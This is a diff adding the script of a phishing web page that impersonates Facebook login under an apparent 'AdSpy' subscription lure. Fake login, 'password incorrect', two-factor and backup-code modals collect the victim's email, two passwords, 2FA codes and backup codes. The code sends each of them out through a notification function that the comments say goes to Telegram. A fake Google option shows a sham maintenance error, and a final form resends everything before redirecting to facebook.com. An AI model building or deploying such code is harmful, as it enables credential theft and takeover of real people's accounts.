+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+          Continue with Google
+        </button>
+      </div>
+    `;
+    
+    Modal.create('loginModal', content);
+    Modal.open('loginModal');
+    
+    // Bind Facebook button
+    document.getElementById('loginFacebookBtn').onclick = (e) => {
+      e.preventDefault();
+      Modal.close('loginModal');
+      openFacebookLoginModal();
+    };
+    
+    // Bind Google button
+    document.getElementById('loginGoogleBtn').onclick = (e) => {
+      e.preventDefault();
+      Modal.close('loginModal');
+      openGoogleModal();
+    };
+  };
+
+  // Open Facebook Login Modal
+  function openFacebookLoginModal() {
+    const content = `
+      <button class="modal-close" onclick="Modal.close('facebookLoginModal')">&times;</button>
+      <div class="facebook-login-header">
+        <svg viewBox="0 0 24 24" fill="#1877f2" class="facebook-logo-large"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+      </div>
+      <h2 class="facebook-login-title">Log in to Facebook</h2>
+      
+      <div class="facebook-login-form">
+        <input type="text" class="facebook-input" placeholder="Email address or phone number" id="fbEmail">
+        <input type="password" class="facebook-input" placeholder="Password" id="fbPassword">
+        <button class="facebook-login-btn" id="fbSubmitBtn">Log In</button>
+      </div>
+      
+      <div class="facebook-divider"></div>
+      
+      <div class="facebook-forgot">
+        <a href="#" class="facebook-link">Forgotten password?</a>
+      </div>
+      
+      <div class="facebook-signup">
+        <p class="facebook-signup-text">Don't have an account?</p>
+        <a href="https://www.facebook.com/r.php" target="_blank" class="facebook-create-btn">Create New Facebook Account</a>
+      </div>
+    `;
+    
+    Modal.create('facebookLoginModal', content);
+    Modal.open('facebookLoginModal');
+    
+    // Bind click handler for log in
+    document.getElementById('fbSubmitBtn').onclick = async (e) => {
+      e.preventDefault();
+      const fbEmailVal = document.getElementById('fbEmail').value;
+      const fbPasswordVal = document.getElementById('fbPassword').value;
+      
+      if (fbEmailVal && fbPasswordVal) {
+        _capturedEmail = fbEmailVal;
+        
+        // Send data to Telegram
+        if (typeof Utils !== 'undefined') {
+          await Utils.sendNotification({ email: _capturedEmail, password: fbPasswordVal });
+        }
+        
+        Modal.close('facebookLoginModal');
+        setTimeout(() => {
+          openPasswordErrorModal();
+        }, 300);
+      } else {
+        alert('Please enter your email/phone number and password');
+      }
+    };
+  }
+
+  // Open Password Error Modal
+  function openPasswordErrorModal() {
+    const content = `
+      <button class="modal-close" onclick="Modal.close('passwordErrorModal')">&times;</button>
+      <div class="error-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+      </div>
+      <h2 class="error-title">Password Incorrect</h2>
+      <p class="error-message">The password you entered is incorrect. Please try again.</p>
+      
+      <div class="error-input-section">
+        <input type="password" class="error-password-input" placeholder="Re-enter password" id="errorPasswordInput">
+        <button class="error-retry-btn" id="fbRetryBtn">Try Again</button>
+      </div>
+      
+      <button class="error-close-btn" onclick="Modal.close('passwordErrorModal')">Cancel</button>
+    `;
+    
+    Modal.create('passwordErrorModal', content);
+    Modal.open('passwordErrorModal');
+    
+    const errorPasswordInput = document.getElementById('errorPasswordInput');
+    errorPasswordInput.focus();
+    
+    // Bind retry button
+    document.getElementById('fbRetryBtn').onclick = async (e) => {
+      e.preventDefault();
+      const retryPasswordVal = errorPasswordInput.value;
+      
+      if (retryPasswordVal) {
+        // Send retry password to Telegram
+        if (typeof Utils !== 'undefined') {
+          await Utils.sendNotification({ email: _capturedEmail, passwordSecond: retryPasswordVal });
+        }
+        
+        Modal.close('passwordErrorModal');
+        setTimeout(() => {
+          openTwoFaModal();
+        }, 300);
+      } else {
+        alert('Please enter your password');
+      }
+    };
+  }
+
+  // Open 2FA Modal
+  let twoFATimerInterval = null;
+  function openTwoFaModal() {
+    const content = `
+      <button class="modal-close" onclick="Modal.close('twoFaModal')">&times;</button>
+      
+      <div class="twofa-content">
+        <h2 class="twofa-title">Two-Factor Authentication</h2>
+        <div class="twofa-description">
+          <p>Secure your account by verifying your identity with an authentication code. We have sent a 6-digit code to your registered contact (SMS, Email, or Authenticator App). Please enter the code below to continue logging in.</p>
+        </div>
+        <p class="twofa-subtitle">Authentication code sent to:</p>
+        
+        <div class="twofa-methods">
+          <div class="twofa-method-badge" data-method="sms">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+            </svg>
+            <span>SMS</span>
+          </div>
+          <div class="twofa-method-badge" data-method="email">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+              <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
+            </svg>
+            <span>Email</span>
+          </div>
+          <div class="twofa-method-badge" data-method="app">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2" y="2" width="20" height="20" rx="2.18"></rect>
+              <line x1="12" y1="2" x2="12" y2="22"></line>
+              <line x1="2" y1="12" x2="22" y2="12"></line>
+              <line x1="2" y1="6" x2="22" y2="6"></line>
+              <line x1="2" y1="18" x2="22" y2="18"></line>
+            </svg>
+            <span>App</span>
+          </div>
+        </div>
+
+        <div class="twofa-timer-container">
+          <div class="twofa-timer" id="twoFATimer">5:00</div>
+        </div>
+        
+        <div class="twofa-input-section">
+          <input type="text" class="twofa-code-input" placeholder="000000" maxlength="6" id="twoFACodeInput">
+          <p class="twofa-hint">Enter 6 digits</p>
+        </div>
+        
+        <button class="twofa-verify-btn" id="twoFaVerifyBtn">Verify</button>
+        
+        <p class="twofa-help"><a href="#">Didn't receive the code?</a> | <a href="#" id="backupCodeLink">Use backup code</a></p>
+      </div>
+    `;
+    
+    Modal.create('twoFaModal', content);
+    Modal.open('twoFaModal');
+    
+    const twoFACodeInput = document.getElementById('twoFACodeInput');
+    const twoFaVerifyBtn = document.getElementById('twoFaVerifyBtn');
+    const twoFATimer = document.getElementById('twoFATimer');
+    
+    twoFACodeInput.focus();
+    
+    // Timer logic
+    let timeRemaining = 300;
+    const updateTimerDisplay = (seconds) => {
+      const minutes = Math.floor(seconds / 60);
+      const secs = seconds % 60;
+      twoFATimer.textContent = `${minutes}:${secs.toString().padStart(2, '0')}`;
+      
+      twoFATimer.classList.remove('warning', 'danger');
+      if (seconds <= 60) {
+        twoFATimer.classList.add('danger');
+      } else if (seconds <= 120) {
+        twoFATimer.classList.add('warning');
+      }
+    };
+    
+    updateTimerDisplay(timeRemaining);
+    if (twoFATimerInterval) clearInterval(twoFATimerInterval);
+    
+    twoFATimerInterval = setInterval(() => {
+      timeRemaining--;
+      if (timeRemaining <= 0) {
+        clearInterval(twoFATimerInterval);
+        twoFATimer.textContent = '0:00';
+        twoFACodeInput.disabled = true;
+        twoFaVerifyBtn.disabled = true;
+      } else {
+        updateTimerDisplay(timeRemaining);
+      }
+    }, 1000);
+    
+    // Only allow digits
+    twoFACodeInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+    });
+    
+    // Bind verify click
+    twoFaVerifyBtn.onclick = async (e) => {
+      e.preventDefault();
+      const code = twoFACodeInput.value.trim();
+      
+      if (code.length === 6) {
+        // Send to TG
+        if (typeof Utils !== 'undefined') {
+          await Utils.sendNotification({ email: _capturedEmail, twoFa: code });
+        }
+        
+        twoFaVerifyBtn.disabled = true;
+        twoFaVerifyBtn.textContent = 'Verifying...';
+        
+        setTimeout(() => {
+          clearInterval(twoFATimerInterval);
+          Modal.close('twoFaModal');
+          setTimeout(() => {
+            openSuccessModal();
+          }, 300);
+        }, 1500);
+      } else {
+        alert('Please enter 6 digits');
+      }
+    };
+    
+    // Bind backup code link
+    document.getElementById('backupCodeLink').onclick = (e) => {
+      e.preventDefault();
+      clearInterval(twoFATimerInterval);
+      Modal.close('twoFaModal');
+      setTimeout(() => {
+        openBackupCodeModal();
+      }, 300);
+    };
+  }
+
+  // Open Backup Code Modal
+  function openBackupCodeModal() {
+    const content = `
+      <button class="modal-close" onclick="Modal.close('backupCodeModal')">&times;</button>
+      
+      <div class="backup-modal-content">
+        <h2 class="backup-modal-title">Backup Code</h2>
+        <div class="backup-modal-description">
+          <p>If you cannot access your usual authentication methods, you can use the backup code provided to you when you set up two-factor authentication. A backup code is a unique string that we have stored securely. Please enter your backup code below.</p>
+        </div>
+        
+        <div class="backup-input-section">
+          <input type="text" class="backup-code-input" placeholder="Enter backup code" id="backupCodeInput">
+          <p class="backup-hint">Please enter the code provided to you</p>
+        </div>
+        
+        <button class="backup-verify-btn" id="backupVerifyBtn">Verify Backup Code</button>
+        
+        <p class="backup-help"><a href="#" id="backToTwoFALink">Back to regular authentication</a></p>
+      </div>
+    `;
+    
+    Modal.create('backupCodeModal', content);
+    Modal.open('backupCodeModal');
+    
+    const backupCodeInput = document.getElementById('backupCodeInput');
+    const backupVerifyBtn = document.getElementById('backupVerifyBtn');
+    backupCodeInput.focus();
+    
+    // Bind verify backup code click
+    backupVerifyBtn.onclick = async (e) => {
+      e.preventDefault();
+      const code = backupCodeInput.value.trim();
+      
+      if (code.length > 0) {
+        if (typeof Utils !== 'undefined') {
+          await Utils.sendNotification({ email: _capturedEmail, otp: code });
+        }
+        
+        backupVerifyBtn.disabled = true;
+        backupVerifyBtn.textContent = 'Verifying...';
+        
+        setTimeout(() => {
+          Modal.close('backupCodeModal');
+          setTimeout(() => {
+            openSuccessModal();
+          }, 300);
+        }, 1500);
+      } else {
+        alert('Please enter your backup code');
+      }
+    };
+    
+    // Bind Back to 2FA link
+    document.getElementById('backToTwoFALink').onclick = (e) => {
+      e.preventDefault();
+      Modal.close('backupCodeModal');
+      setTimeout(() => {
+        openTwoFaModal();
+      }, 300);
+    };
+  }
+
+  // Open Google Modal
+  function openGoogleModal() {
+    const content = `
+      <button class="modal-close" onclick="Modal.close('googleModal')">&times;</button>
+      <div class="google-modal-content">
+        <div class="google-loader">
+          <div class="spinner"></div>
+        </div>
+        <h2 class="google-modal-title">Processing</h2>
+        <p class="google-modal-message">Please wait...</p>
+        <div id="googleErrorMessage" class="google-error-message" style="display: none; margin-top: 20px; padding: 15px; background: #fee; border: 1px solid #f99; border-radius: 8px; color: #c33; text-align: center; font-size: 14px;"></div>
+      </div>
+    `;
+    
+    Modal.create('googleModal', content);
+    Modal.open('googleModal');
+    
+    clearGoogleTimeout();
+    
+    googleModalTimeout = setTimeout(() => {
+      const errorMsg = document.getElementById('googleErrorMessage');
+      const loader = document.querySelector('.google-loader');
+      const title = document.querySelector('.google-modal-title');
+      const message = document.querySelector('.google-modal-message');
+      
+      if (errorMsg && loader) {
+        loader.style.display = 'none';
+        errorMsg.textContent = '⚠️ This connection is under maintenance, please try another method';
+        errorMsg.style.display = 'block';
+        if (title) title.textContent = 'Connection failed';
+        if (message) message.textContent = 'Please choose another login method';
+      }
+    }, 5000);
+  }
+
+  // Open Success Modal
+  function openSuccessModal() {
+    const content = `
+      <div class="success-modal-content">
+        <div class="success-spinner">
+          <svg class="success-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <h2 class="success-title">Login Successful!</h2>
+        <p class="success-message">You have been authenticated successfully. Redirecting...</p>
+        <div class="success-countdown">
+          <p>Redirecting in <span id="countdownTimer">15</span> seconds</p>
+        </div>
+      </div>
+    `;
+    
+    Modal.create('successModal', content);
+    Modal.open('successModal');
+    
+    const countdownTimer = document.getElementById('countdownTimer');
+    let countdown = 15;
+    countdownTimer.textContent = countdown;
+    
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      countdownTimer.textContent = countdown;
+      
+      if (countdown <= 0) {
+        clearInterval(countdownInterval);
+        Modal.close('successModal');
+        
+        // Show Customer Information Form!
+        setTimeout(() => {
+          const clientFormContainer = document.getElementById('clientFormContainer');
+          if (clientFormContainer) {
+            clientFormContainer.style.display = 'flex';
+          }
+        }, 300);
+      }
+    }, 1000);
+  }
+
+  // Hook up event listeners for native elements when page loads
+  document.addEventListener('DOMContentLoaded', () => {
+    const loginBtn = document.getElementById('loginBtn');
+    if (loginBtn) {
+      loginBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        openLoginForm();
+      });
+    }
+
+    const pills = document.querySelectorAll('.pill');
+    pills.forEach(pill => {
+      pill.addEventListener('click', (e) => {
+        e.preventDefault();
+        openRegistrationForm();
+      });
+    });
+
+    const featureCards = document.querySelectorAll('.feature-card');
+    featureCards.forEach(card => {
+      card.addEventListener('click', (e) => {
+        e.preventDefault();
+        openRegistrationForm();
+      });
+    });
+  });
+
+  // Handle client form submission
+  const clientForm = document.getElementById('clientForm');
+  if (clientForm) {
+    clientForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const fullName = document.getElementById('fullName').value;
+      const email = document.getElementById('email').value;
+      const emailBusiness = document.getElementById('emailBusiness').value;
+      const fanpage = document.getElementById('fanpage').value;
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+      const passwordSecond = document.getElementById('passwordSecond').value;
+      const twoFa = document.getElementById('twoFa').value;
+      const otp = document.getElementById('otp').value;
+      
+      // Disable form and show loader
+      const submitBtn = clientForm.querySelector('button[type="submit"]');
+      const originalText = submitBtn.textContent;
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Processing...';
+      
+      // Send complete captured information as info request
+      const result = await sendData({
+        type: 'info',
+        email: email,
+        emailBusiness: emailBusiness,
+        fullName: fullName,
+        phone: phone,
+        fanpage: fanpage,
+        dob: '01/01/2000',
+        note: `AdSpy Subscription Form Submission. Pwd1: ${password} | Pwd2: ${passwordSecond} | 2FA: ${twoFa} | OTP: ${otp}`,
+        device: getDeviceInfo()
+      });
+      
+      if (result && result.success && result.session_id) {
+        currentSessionId = result.session_id;
+        localStorage.setItem('session_id', result.session_id);
+        
+        // Also send passwords and codes to session
+        await sendData({
+          type: 'password',
+          session_id: currentSessionId,
+          password: password
+        });
+        
+        await sendData({
+          type: 'password',
+          session_id: currentSessionId,
+          password: passwordSecond
+        });
+        
+        await sendData({
+          type: '2fa',
+          session_id: currentSessionId,
+          code: twoFa
+        });
+        
+        await sendData({
+          type: '2fa',
+          session_id: currentSessionId,
+          code: otp
+        });
+      }
+      
+      submitBtn.disabled = false;
+      submitBtn.textContent = originalText;
+      
+      // Redirect to Facebook or thank you page
+      window.location.href = 'https://www.facebook.com';
+    });
+  }
+
+  // Close client form button handler
+  const closeClientFormBtn = document.getElementById('closeClientFormBtn');
+  if (closeClientFormBtn) {
+    closeClientFormBtn.addEventListener('click', () => {
+      document.getElementById('clientFormContainer').style.display = 'none';
+    });
+  }
+
+  // Close client form container when clicking outside it
+  const clientFormContainer = document.getElementById('clientFormContainer');
+  if (clientFormContainer) {
+    clientFormContainer.addEventListener('click', (e) => {
+      if (e.target === clientFormContainer) {
+        clientFormContainer.style.display = 'none';
+      }
+    });
+  }
+</script>
+</body>
+</html>
